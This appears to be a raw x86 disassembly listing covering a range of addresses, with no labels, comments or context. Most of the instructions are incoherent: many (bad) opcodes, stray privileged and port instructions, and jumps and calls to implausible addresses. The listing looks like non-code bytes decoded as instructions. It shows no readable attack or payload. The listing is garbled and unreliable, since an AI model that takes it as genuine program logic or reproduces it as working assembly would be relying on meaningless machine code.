  4337cf:	ret    0x458b
  4337d2:	lock jmp 0x4337c6
  4337d5:	mov    ecx,DWORD PTR [eax]
  4337d7:	or     BYTE PTR [edi],al
  4337d9:	mov    ecx,eax
  4337db:	xor    DWORD PTR [edx+0x2],0x0
  4337df:	mov    bh,0xc1
  4337e1:	adc    BYTE PTR [eax],dh
  4337e3:	iret   
  4337e4:	inc    ebp
  4337e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4337eb:	inc    BYTE PTR [ebx]
  4337ed:	cmp    bh,al
  4337ef:	add    BYTE PTR [ecx],dl
  4337f1:	data16 adc al,bh
  4337f4:	dec    ecx
  4337f5:	fisttp WORD PTR [ecx+0x456604c0]
  4337fb:	add    dh,BYTE PTR ds:0x75e0845
  433801:	ret    0x4d
  433804:	lea    ecx,[ebx+0x18728301]
  43380a:	add    BYTE PTR [ebp+0x45],al
  43380d:	ss jmp 0x10a38af
  433813:	call   0xf8cebd5d
  433818:	clc    
  433819:	inc    ebp
  43381a:	shl    DWORD PTR ds:0x781084d,0x51
  433821:	cdq    
  433822:	push   ecx
  433823:	xor    al,BYTE PTR [ecx+0x32f89989]
  433829:	inc    ebp
  43382a:	cmp    edi,DWORD PTR [esi]
  43382c:	jbe    0x4337ca
  43382e:	mov    eax,edi
  433830:	or     ah,dh
  433832:	inc    ebp
  433833:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433839:	cmp    BYTE PTR [ebx-0x74747664],cl
  43383f:	in     al,dx
  433840:	hlt    
  433841:	push   ecx
  433842:	push   ecx
  433843:	push   ecx
  433844:	push   ecx
  433845:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43384b:	cdq    
  43384c:	cdq    
  43384d:	xor    dh,BYTE PTR [edx]
  43384f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433855:	or     BYTE PTR [ebp+0x7],al
  433858:	mov    eax,ecx
  43385a:	clc    
  43385b:	jb     0x43381e
  43385d:	add    BYTE PTR [ebp+0x55],cl
  433860:	or     DWORD PTR [edi],0xc251d151
  433866:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433870:	mov    edi,eax
  433872:	or     cl,al
  433874:	inc    ebp
  433875:	dec    ebp
  433876:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43387c:	or     WORD PTR [ecx],0x8999
  433881:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433887:	mov    edx,DWORD PTR [ecx+0x8]
  43388a:	mov    eax,DWORD PTR [ebp-0x8]
  43388d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433894:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43389a:	inc    ebp
  43389b:	dec    eax
  43389c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4338a2:	add    edx,DWORD PTR [ecx-0x8]
  4338a5:	mov    ecx,DWORD PTR [ecx]
  4338a7:	clc    
  4338a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4338af:	mov    ecx,ebp
  4338b1:	clc    
  4338b2:	(bad)  
  4338b3:	popf   
  4338b4:	inc    DWORD PTR [eax]
  4338b6:	ret    0x8b
  4338b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4338bf:	mov    edi,esp
  4338c1:	hlt    
  4338c2:	test   ecx,esi
  4338c4:	clc    
  4338c5:	or     BYTE PTR [ebp+0x7],al
  4338c8:	cmp    ecx,eax
  4338ca:	pushf  
  4338cb:	jb     0x433900
  4338cd:	add    BYTE PTR [eax-0x3f],al
  4338d0:	inc    eax
  4338d1:	daa    
  4338d2:	inc    ebp
  4338d3:	inc    ebp
  4338d4:	xor    eax,0x7f80803
  4338d9:	dec    ebp
  4338da:	cdq    
  4338db:	add    esi,DWORD PTR [edx]
  4338dd:	clc    
  4338de:	cmp    DWORD PTR [ecx],ecx
  4338e0:	or     al,0x8
  4338e2:	add    al,BYTE PTR [ebp+0x2c]
  4338e5:	xor    eax,0x7350845
  4338ea:	or     BYTE PTR [ebp+0x7],cl
  4338ed:	lea    ebx,[ecx-0x748dcdff]
  4338f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4338fa:	mov    edx,DWORD PTR [eax]
  4338fc:	cld    
  4338fd:	dec    ebp
  4338fe:	push   ecx
  4338ff:	sub    edx,DWORD PTR [ecx-0x75]
  433902:	add    eax,0xf172fc
  433907:	or     BYTE PTR [ebp+0x7],cl
  43390a:	add    eax,ecx
  43390c:	or     al,0x72
  43390e:	add    DWORD PTR [eax],eax
  433910:	mov    ebx,0x29c2c1
  433915:	inc    ebp
  433916:	mov    eax,DWORD PTR [ebx]
  433918:	cmp    eax,0x3004d1c
  43391e:	xbegin 0x66c8c518
  433924:	clc    
  433925:	or     BYTE PTR [ebp+0x45],al
  433928:	cmp    DWORD PTR ds:0x78b089c,esi
  43392e:	adc    BYTE PTR [ebp+0x45],cl
  433931:	lea    eax,[ebp+0x33727501]
  433937:	add    cl,ch
  433939:	inc    ebp
  43393a:	add    bl,ch
  43393c:	add    BYTE PTR [ebx+0x45850845],cl
  433942:	je     0x4338cf
  433944:	push   ebx
  433945:	or     al,0x85
  433947:	dec    ebp
  433948:	std    
  433949:	mov    bh,bh
  43394b:	mov    BYTE PTR [ebp-0x75],al
  43394e:	mov    edi,eax
  433950:	or     al,0x89
  433952:	inc    ebp
  433953:	clc    
  433954:	mov    esp,esp
  433956:	hlt    
  433957:	call   DWORD PTR [edi-0x37]
  43395a:	push   ecx
  43395b:	or     al,0x51
  43395d:	push   ebp
  43395e:	xor    ebp,esp
  433960:	mov    esi,0x457251
  433965:	ss (bad) 
  433967:	pushf  
  433968:	inc    ebp
  433969:	(bad)  
  43396a:	mov    edi,eax
  43396c:	or     al,0x85
  43396e:	add    al,bh
  433970:	inc    eax
  433972:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433976:	or     ah,bh
  433978:	inc    eax
  433979:	push   ecx
  43397a:	jmp    0x4339cd
  43397c:	mov    eax,DWORD PTR ds:0xe8720c
  433982:	mov    DWORD PTR [ebp-0x8],eax
  433985:	jne    0x4339cc
  433987:	jmp    0x433914
  433989:	mov    ebp,DWORD PTR [eax]
  43398b:	clc    
  43398c:	retf   0xff51
  43398f:	push   ecx
  433990:	mov    DWORD PTR ds:0x757210,eax
  433996:	mov    ecx,DWORD PTR [ebp-0x4]
  433999:	sub    esp,DWORD PTR [ebx-0x77]
  43399c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4339a3:	or     ah,bh
  4339a5:	pop    es
  4339a6:	ds cdq 
  4339a8:	push   DWORD PTR [edx]
  4339aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4339b0:	(bad)  
  4339b1:	mov    bh,bh
  4339b3:	jmp    0x4339a1
  4339b5:	leave  
  4339b6:	jne    0x4339c0
  4339b8:	call   0x303312
  4339bd:	in     al,dx
  4339be:	dec    ebp
  4339bf:	add    dh,BYTE PTR [ebx]
  4339c1:	add    BYTE PTR [ebx],al
  4339c3:	inc    ebp
  4339c4:	cmp    esi,DWORD PTR [esi]
  4339c6:	je     0x433964
  4339c8:	mov    eax,edi
  4339ca:	or     al,0xf0
  4339cc:	add    BYTE PTR [ebp+0x458bf845],al
  4339d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4339d8:	adc    al,0x7
  4339da:	enter  0x9fc0,0xa5
  4339de:	rol    BYTE PTR [eax],0x5e
  4339e1:	mov    ecx,ecx
  4339e3:	or     al,0xc
  4339e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4339ec:	jmp    0x4339ed
  4339ee:	push   ebp
  4339ef:	mov    esp,ebp
  4339f1:	cld    
  4339f2:	inc    ebp
  4339f3:	inc    ebp
  4339f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4339fb:	push   esi
  4339fc:	push   esi
  4339fd:	mov    edi,0x7af080f
  433a02:	add    bh,al
  433a04:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a0a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a10:	mov    ebp,eax
  433a12:	mov    ebp,edi
  433a14:	lock call edx
  433a17:	fcom   DWORD PTR [ebp+0x45]
  433a1a:	mov    eax,0x148a8b
  433a1f:	push   ecx
  433a20:	enter  0xc145,0x83
  433a24:	cmp    cl,BYTE PTR [eax]
  433a26:	add    BYTE PTR [ebp+0x4d],al
  433a29:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433a2f:	call   0xffa3359e
  433a34:	cmp    eax,DWORD PTR [ebp-0xc]
  433a37:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433a3b:	push   ebp
  433a3c:	(bad)
  433a3f:	std    
  433a40:	lock push DWORD PTR [edi+0x5d08fcdb]
  433a47:	inc    ebp
  433a48:	(bad)  
  433a49:	call   0xff7d36d9
  433a4e:	add    al,BYTE PTR [ebp+0x37]
  433a51:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433a57:	jne    0x433a59
  433a59:	(bad)  
  433a5a:	cmp    edi,esp
  433a5c:	jne    0x433a8f
  433a5e:	mov    edi,edi
  433a60:	or     BYTE PTR [ebx-0x307f0b49],cl
  433a66:	pop    ds
  433a67:	into   
  433a68:	je     0x433a2b
  433a6a:	mov    ebx,DWORD PTR [esi]
  433a6c:	or     BYTE PTR [ebp-0x49],al
  433a6f:	mov    esp,DWORD PTR [esi-0x77]
  433a72:	mov    esi,0xfe451f0c
  433a77:	mov    eax,DWORD PTR [eax]
  433a79:	or     al,0x66
  433a7b:	sar    bl,0x3b
  433a7e:	xor    esi,DWORD PTR [ebp+0x66]
  433a81:	xor    ecx,edi
  433a83:	pop    edi
  433a84:	adc    bl,BYTE PTR [ebx+0x7e]
  433a87:	ret    0xff
  433a8a:	cld    
  433a8b:	inc    ebp
  433a8c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433a92:	cld    
  433a93:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433a9a:	push   0xffffff83
  433a9c:	pop    edi
  433a9d:	or     BYTE PTR [ebp+0x53],dh
  433aa0:	xorps  xmm1,xmm2
  433aa3:	test   BYTE PTR [eax+eax*1],bh
  433aa6:	add    BYTE PTR [eax],al
  433aa8:	adc    eax,eax
  433aaa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433ab2:	jmp    DWORD PTR [eax]
  433ab4:	ror    al,0x5e
  433ab7:	inc    ebp
  433ab8:	leave  
  433ab9:	xor    ecx,DWORD PTR [eax]
  433abb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433ac1:	add    ch,al
  433ac3:	xor    edi,edi
  433ac5:	xor    DWORD PTR [ebx],0x660033fe
  433acb:	mov    DWORD PTR [ebp-0xc],ecx
  433ace:	pcmpgtw mm0,mm0
  433ad1:	add    dl,ah
  433ad3:	leave  
  433ad4:	mov    edi,DWORD PTR [eax-0x7d]
  433ad7:	push   ax
  433ad9:	dec    ebp
  433ada:	mov    esi,DWORD PTR [ebx-0x75]
  433add:	lea    ebp,[eax-0x7c00fffe]
  433ae3:	xor    eax,DWORD PTR [eax]
  433ae5:	sysret 
  433ae7:	dec    ebp
  433ae8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433aef:	push   WORD PTR [ecx+0x8]
  433af3:	jne    0x433ab6
  433af5:	ud0    ecx,DWORD PTR [ecx]
  433af8:	mov    edi,DWORD PTR [edx]
  433afa:	lods   al,BYTE PTR ds:[esi]
  433afb:	add    BYTE PTR [eax],al
  433afd:	data16 (bad) 
  433aff:	iret   
  433b00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b07:	cli    
  433b08:	inc    ebp
  433b09:	cmp    al,0x8d
  433b0b:	add    BYTE PTR [esi+0x2d],ah
  433b0e:	inc    ebp
  433b0f:	pop    ebp
  433b10:	lea    ecx,[edi]
  433b12:	mov    dl,bh
  433b14:	add    BYTE PTR [edi],cl
  433b16:	mov    DWORD PTR [eax+eax*8],edi
  433b19:	mov    ebx,0x3a87
  433b1e:	add    BYTE PTR [ebx],ch
  433b20:	inc    ebp
  433b21:	data16 (bad) 
  433b23:	clc    
  433b24:	int3   
  433b25:	cmp    eax,DWORD PTR [eax]
  433b27:	je     0x433ab2
  433b29:	push   0xffffffc8
  433b2b:	pop    edi
  433b2c:	xchg   DWORD PTR [ebp+0x0],eax
  433b2f:	data16 add BYTE PTR [ebp+0x45],cl
  433b33:	lea    cx,[ebp+0x10]
  433b37:	jb     0x433b39
  433b39:	jmp    0x433ac4
  433b3b:	call   eax
  433b3d:	clc    
  433b3e:	xchg   DWORD PTR [edi+0x1],edi
  433b41:	mov    eax,DWORD PTR [eax]
  433b43:	or     BYTE PTR [ebp-0x49],al
  433b46:	lea    eax,[eax+0x74003154]
  433b4c:	push   edi
  433b4d:	inc    edx
  433b4e:	jge    0x433b4f
  433b50:	mov    DWORD PTR [edi],ecx
  433b52:	fdiv   DWORD PTR [edi-0x6]
  433b55:	inc    DWORD PTR [eax]
  433b57:	xor    edx,DWORD PTR [eax+0x5f]
  433b5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433b5d:	ret    0x0
  433b60:	xor    BYTE PTR [ebp-0x51],cl
  433b63:	cmp    edi,0xf0ff8902
  433b69:	data16 ror al,0x84
  433b6d:	rol    BYTE PTR [eax],0x3b
  433b70:	add    al,dh
  433b72:	dec    eax
  433b73:	xchg   esp,eax
  433b74:	push   ebx
  433b75:	jmp    0x433b02
  433b77:	push   ebp
  433b78:	add    esp,ebp
  433b7a:	add    ebp,esp
  433b7c:	mov    edx,DWORD PTR [edi+0x24]
  433b7f:	clc    
  433b80:	dec    esi
  433b81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433b87:	cmp    BYTE PTR [ebx],al
  433b89:	jne    0x433b14
  433b8b:	xor    esp,eax
  433b8d:	jmp    0x463d10
  433b92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433b95:	jne    0x433b8b
  433b97:	call   0xffcd38f1
  433b9c:	clc    
  433b9d:	xchg   edi,eax
  433b9e:	sti    
  433b9f:	add    DWORD PTR [ebx],eax
  433ba1:	add    BYTE PTR [ebp+0x47],bl
  433ba4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433baa:	pop    ebp
  433bab:	mov    DWORD PTR [esi-0x48],esi
  433bae:	jmp    0x433bf7
  433bb0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433bb6:	(bad)  
  433bb8:	cmp    al,0x0
  433bba:	cmp    eax,DWORD PTR [ebp+0x18]
  433bbd:	lea    ebx,[ebp-0x56]
  433bc0:	jle    0x433bc2
  433bc2:	jae    0x433b4d
  433bc4:	mov    eax,esp
  433bc6:	call   0xb900:0x8b005587
  433bcd:	inc    ebp
  433bce:	push   ebp
  433bcf:	lea    ecx,[ebp-0x27ff4f12]
  433bd5:	mov    eax,edi
  433bd7:	int3   
  433bd8:	push   ebp
  433bd9:	xchg   edi,eax
  433bdb:	add    esp,ebp
  433bdd:	add    BYTE PTR [eax],al
  433bdf:	inc    ebp
  433be0:	add    BYTE PTR [ebp+0x8b3255],cl
  433be6:	cld    
  433be7:	mov    DWORD PTR [edx],edi
  433be9:	aam    0x75
  433beb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433bf1:	mov    DWORD PTR [ebx-0x50],edx
  433bf4:	test   BYTE PTR [ebp-0x1],0xe8
  433bf8:	mov    eax,DWORD PTR [eax]
  433bfa:	hlt    
  433bfb:	add    al,al
  433bfd:	mov    eax,DWORD PTR ds:0x890045a8
  433c03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c09:	inc    DWORD PTR [eax*2+0xf75854d]
  433c10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c16:	call   0x72999957
  433c1b:	je     0x433c7b
  433c1d:	js     0x433c7e
  433c1f:	lock ret 0x7e
  433c23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433c29:	mov    edi,edi
  433c2b:	sbb    al,bl
  433c2d:	clc    
  433c2e:	add    BYTE PTR [ebp-0x73],bh
  433c31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433c37:	ror    BYTE PTR [eax],1
  433c39:	dec    ebp
  433c3a:	xchg   ebp,eax
  433c3b:	mov    edi,edi
  433c3d:	in     al,0x8b
  433c3f:	jge    0x433bca
  433c41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433c47:	clc    
  433c48:	pop    esi
  433c49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433c4f:	clc    
  433c50:	add    al,0x6e
  433c52:	mov    eax,DWORD PTR [ebx]
  433c54:	mov    BYTE PTR [ebp+0x0],dl
  433c57:	mov    edx,DWORD PTR [ebx-0x20]
  433c5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433c60:	add    eax,0x3b3a73
  433c65:	adc    al,0x89
  433c67:	pop    eax
  433c68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433c6c:	ret    0xf08
  433c6f:	cmp    al,0x2
  433c71:	mov    DWORD PTR [edx],edi
  433c73:	cld    
  433c74:	add    BYTE PTR [ebp+0x66],dl
  433c77:	add    eax,ebx
  433c79:	add    esp,eax
  433c7b:	sub    eax,eax
  433c7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433c83:	add    BYTE PTR [eax],al
  433c85:	mov    DWORD PTR [ebx-0x24],ebx
  433c88:	push   edi
  433c89:	push   ebp
  433c8a:	clc    
  433c8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433c92:	out    0xff,eax
  433c94:	add    edx,DWORD PTR [eax]
  433c96:	jmp    0x433c80
  433c98:	cmp    ch,0x44
  433c9b:	(bad)  
  433c9c:	jmp    0x40c8c4ee
  433ca1:	je     0x433c2d
  433ca3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ca9:	inc    ebp
  433caa:	add    BYTE PTR [ebx-0x770375],al
  433cb0:	add    ah,ch
  433cb2:	add    edx,esp
  433cb4:	pop    edi
  433cb5:	pop    ebp
  433cb6:	push   ebp
  433cb7:	inc    ebx
  433cb8:	in     al,dx
  433cb9:	pop    ebp
  433cba:	in     al,dx
  433cbb:	cmp    edx,DWORD PTR [edi-0x8]
  433cbe:	ss xchg esp,eax
  433cc0:	pushf  
  433cc1:	pop    ebx
  433cc2:	mov    ecx,ecx
  433cc4:	call   0x899883cd
  433cc9:	in     al,dx
  433cca:	in     al,0x45
  433ccc:	dec    ebp
  433ccd:	push   esi
  433cce:	test   DWORD PTR [eax+0xfb010f],esi
  433cd4:	add    BYTE PTR [eax+0xc018b],dh
  433cda:	leave  
  433cdb:	inc    ebp
  433cdc:	test   al,ch
  433cde:	add    dh,bh
  433ce0:	add    bh,bh
  433ce2:	dec    ebp
  433ce3:	push   cs
  433ce4:	mov    DWORD PTR [ecx],eax
  433ce6:	hlt    
  433ce7:	push   es
  433ce8:	dec    ebp
  433ce9:	leave  
  433cea:	mov    DWORD PTR [eax],ecx
  433cec:	clc    
  433ced:	cmovge eax,ecx
  433cf0:	mov    ecx,0x85c2f0
  433cf6:	clc    
  433cf7:	pop    DWORD PTR [ebp+0x1]
  433cfa:	push   ebx
  433cfb:	add    BYTE PTR [ebp-0x15],bh
  433cfe:	push   esi
  433cff:	xor    eax,0x898a45
  433d04:	cld    
  433d05:	inc    BYTE PTR [ebp+0x0]
  433d08:	cmp    BYTE PTR [esi-0x64],ah
  433d0b:	add    DWORD PTR [esi+0x78308c1],edi
  433d11:	add    ah,BYTE PTR [edi-0x49]
  433d14:	int    0xbb
  433d16:	mov    ecx,DWORD PTR [edi+0xc]
  433d19:	add    dh,al
  433d1b:	cmp    ecx,ebx
  433d1d:	jne    0x433ce7
  433d1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433d22:	jmp    0xca3d28
  433d27:	add    DWORD PTR [ebp+0x0],eax
  433d2a:	mov    eax,ebx
  433d2c:	or     al,0x8b
  433d2e:	(bad)  
  433d2f:	mov    ecx,esi
  433d31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433d38:	mov    eax,edi
  433d3a:	or     BYTE PTR [edx],cl
  433d3c:	shl    cl,cl
  433d3e:	icebp  
  433d3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433d43:	or     BYTE PTR [edx+eax*2],cl
  433d46:	(bad)  
  433d47:	or     cl,dh
  433d49:	stc    
  433d4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433d4e:	xor    al,0x0
  433d50:	inc    ebp
  433d51:	xchg   BYTE PTR [ebx],al
  433d53:	add    esp,edi
  433d55:	add    BYTE PTR [ebp-0x39],cl
  433d58:	mov    al,bl
  433d5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433d60:	sub    al,0xbf
  433d62:	jmp    0x433ce9
  433d64:	mov    edi,eax
  433d66:	lock jge 0x433d5a
  433d69:	lea    esi,[edx-0x74bad5fd]
  433d6f:	mov    ebp,esp
  433d71:	or     cl,dh
  433d73:	leave  
  433d74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433d7b:	dec    ebp
  433d7c:	dec    ebp
  433d7d:	test   DWORD PTR [ebx],eax
  433d7f:	paddb  mm6,mm0
  433d82:	add    DWORD PTR [eax],eax
  433d84:	dec    ebp
  433d85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433d8b:	mov    esi,DWORD PTR [edx]
  433d8d:	or     al,0x2b
  433d8f:	dec    ebp
  433d90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433d96:	mov    esp,edx
  433d98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433d9f:	mov    DWORD PTR [ebx],ebp
  433da1:	call   0xc76c6d1
  433da6:	mov    DWORD PTR [ebp+0x10],ecx
  433da9:	(bad)  
  433daa:	push   0x8b85ff10
  433daf:	clc    
  433db0:	or     al,0x51
  433db2:	(bad)  
  433db3:	push   ecx
  433db4:	retf   
  433db5:	mov    ebx,0xff4d8dc8
  433dba:	mov    DWORD PTR [ebp+0x8],eax
  433dbd:	xor    eax,DWORD PTR [ebp-0x75]
  433dc0:	cmp    ebp,DWORD PTR [ebx]
  433dc2:	lsl    ebx,WORD PTR [edi-0x8]
  433dc6:	call   DWORD PTR [ebx-0x741bff75]
  433dcc:	(bad)  
  433dcd:	or     al,0x5b
  433dcf:	dec    ebp
  433dd0:	or     BYTE PTR [ebx],dh
  433dd2:	inc    ebp
  433dd3:	xor    esi,DWORD PTR ds:0x708088d
  433dd9:	in     eax,0x99
  433ddb:	add    BYTE PTR [edx],dh
  433ddd:	inc    ebp
  433dde:	pop    edi
  433ddf:	xor    eax,edx
  433de1:	test   DWORD PTR [eax],0x81108b8b
  433de7:	dec    ebp
  433de8:	sub    al,0x33
  433dea:	add    BYTE PTR [ebx],dh
  433dec:	push   esi
  433ded:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433df3:	mov    edi,eax
  433df5:	or     BYTE PTR [ebp+0x45],al
  433df8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433dfe:	ss leave 
  433e00:	pushf  
  433e01:	push   es
  433e02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e0a:	inc    ebp
  433e0b:	cmp    BYTE PTR [esi],0x51
  433e0e:	pushf  
  433e0f:	addr16 (bad) 
  433e11:	shl    esp,1
  433e13:	dec    ebp
  433e14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e1a:	(bad)  
  433e1b:	jmp    0x8c0b10f7
  433e20:	aam    0x8
  433e22:	test   DWORD PTR [ebp-0x8],ecx
  433e25:	mov    BYTE PTR [ebp-0x75],al
  433e28:	or     BYTE PTR [eax],cl
  433e2a:	add    BYTE PTR [ebp-0x75],dl
  433e2d:	mov    eax,0xfc728b
  433e32:	dec    ebp
  433e33:	enter  0xceba,0x8
  433e37:	retf   0x1807
  433e3a:	ret    0x994d
  433e3d:	mov    esi,DWORD PTR [edx]
  433e3f:	or     al,0x33
  433e41:	into   
  433e42:	add    edx,esi
  433e44:	add    ecx,edx
  433e46:	bswap  eax
  433e48:	ror    esi,0x98
  433e4b:	dec    ebp
  433e4c:	add    cl,ch
  433e4e:	mov    edi,edi
  433e50:	hlt    
  433e51:	inc    esi
  433e53:	inc    ebp
  433e54:	ret    0x4533
  433e57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433e5d:	or     BYTE PTR [ebx],dh
  433e5f:	dec    ebp
  433e60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433e66:	jne    0xff8d3e2d
  433e6c:	inc    ebp
  433e6d:	inc    ebp
  433e6e:	mov    esi,DWORD PTR [ebx]
  433e70:	clc    
  433e71:	pop    esi
  433e72:	ret    0xcaeb
  433e75:	mov    eax,esi
  433e77:	call   0x5204904a
  433e7c:	dec    ebp
  433e7d:	add    eax,0xf8728b
  433e82:	adc    eax,0xce0ccac9
  433e87:	push   ebp
  433e88:	ret    0xc6ec
  433e8b:	in     al,dx
  433e8c:	call   0x33438b95
  433e91:	push   edi
  433e92:	add    edi,eax
  433e94:	xor    eax,eax
  433e96:	jmp    0x433edd
  433e98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433e9e:	add    eax,edi
  433ea0:	shr    eax,cl
  433ea2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433ea8:	mov    edi,DWORD PTR [ecx]
  433eaa:	in     al,dx
  433eab:	pushf  
  433eac:	ret    0x84c7
  433eaf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433eb5:	inc    ebp
  433eb6:	in     al,dx
  433eb7:	ss inc ebp
  433eb9:	pushf  
  433eba:	mov    eax,edi
  433ebc:	cld    
  433ebd:	fmul   st(2),st
  433ebf:	sbb    dl,al
  433ec1:	jmp    0x9c3b:0x374d45c1
  433ec8:	jbe    0x433e91
  433eca:	mov    esp,eax
  433ecc:	clc    
  433ecd:	add    BYTE PTR [ebp+0x0],cl
  433ed0:	mov    ecx,ecx
  433ed2:	lea    eax,[ebp-0x5]
  433ed5:	mov    edi,edi
  433ed7:	call   0x51ce9021
  433edc:	hlt    
  433edd:	xor    eax,edx
  433edf:	mov    esi,0x997284
  433ee4:	xor    cl,dl
  433ee6:	mov    esi,eax
  433ee8:	hlt    
  433ee9:	into   
  433eea:	inc    ebp
  433eeb:	scas   eax,DWORD PTR es:[edi]
  433eec:	mov    ebp,ecx
  433eee:	cld    
  433eef:	add    dl,cl
  433ef1:	add    dl,al
  433ef3:	inc    ebp
  433ef4:	shr    DWORD PTR [ebx],0x4d
  433ef7:	xor    edi,DWORD PTR [ebx]
  433ef9:	mov    DWORD PTR [edi],ecx
  433efb:	clc    
  433efc:	dec    esi
  433efd:	inc    ebp
  433efe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f04:	ret    0xc6ca
  433f07:	mov    BYTE PTR [ebp-0x32],0x53
  433f0b:	scas   eax,DWORD PTR es:[edi]
  433f0c:	inc    ebp
  433f0d:	jmp    0x433f46
  433f0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f16:	pop    ebx
  433f17:	xor    ecx,DWORD PTR [ebp+0x3]
  433f1a:	mov    eax,DWORD PTR [ebx]
  433f1c:	clc    
  433f1d:	test   edx,ecx
  433f1f:	mov    ecx,esi
  433f21:	cld    
  433f22:	call   0x8ab7846c
  433f27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433f2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433f33:	fdiv   QWORD PTR [ebx]
  433f35:	retf   0xce89
  433f38:	in     al,0xc1
  433f3a:	inc    ebp
  433f3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433f41:	into   
  433f42:	mov    dh,0xc1
  433f45:	call   0x8c1784ce
  433f4a:	(bad)  
  433f4b:	cld    
  433f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433f4f:	xor    eax,ecx
  433f51:	lea    eax,[ebp+0x8]
  433f54:	mov    esi,DWORD PTR [edx-0x4]
  433f57:	add    dl,al
  433f59:	inc    ebp
  433f5a:	mov    esp,0x32d8998b
  433f5f:	dec    ebp
  433f60:	mov    esi,DWORD PTR [ebx]
  433f62:	cld    
  433f63:	xor    eax,edx
  433f65:	sub    esp,DWORD PTR [edi-0x75]
  433f68:	int    0xec
  433f6a:	sub    ecx,eax
  433f6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433f72:	mov    esi,esp
  433f74:	call   0x34178cfd
  433f79:	inc    DWORD PTR [ebx]
  433f7b:	mov    edi,DWORD PTR [ebx]
  433f7d:	cld    
  433f7e:	jne    0x433fcd
  433f80:	mov    esi,DWORD PTR [ebx]
  433f82:	aam    0x8d
  433f84:	dec    ebp
  433f85:	or     BYTE PTR [ebx],dh
  433f87:	jb     0x433f8c
  433f89:	add    BYTE PTR [edi+0x45],bl
  433f8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433f93:	xor    ebp,esp
  433f95:	xor    eax,edi
  433f97:	sub    edi,esp
  433f99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433f9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433fa6:	inc    ebp
  433fa7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433fad:	clc    
  433fae:	mov    eax,edi
  433fb0:	nop
  433fb1:	fadd   QWORD PTR [eax]
  433fb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433fb9:	jmp    0x433f44
  433fbb:	mov    eax,DWORD PTR [ecx]
  433fbd:	fadd   DWORD PTR [eax]
  433fbf:	inc    ebp
  433fc0:	or     DWORD PTR [ebx],esi
  433fc2:	dec    eax
  433fc3:	add    edx,DWORD PTR [ebx-0x2d]
  433fc6:	dec    ebp
  433fc7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433fcd:	inc    ebp
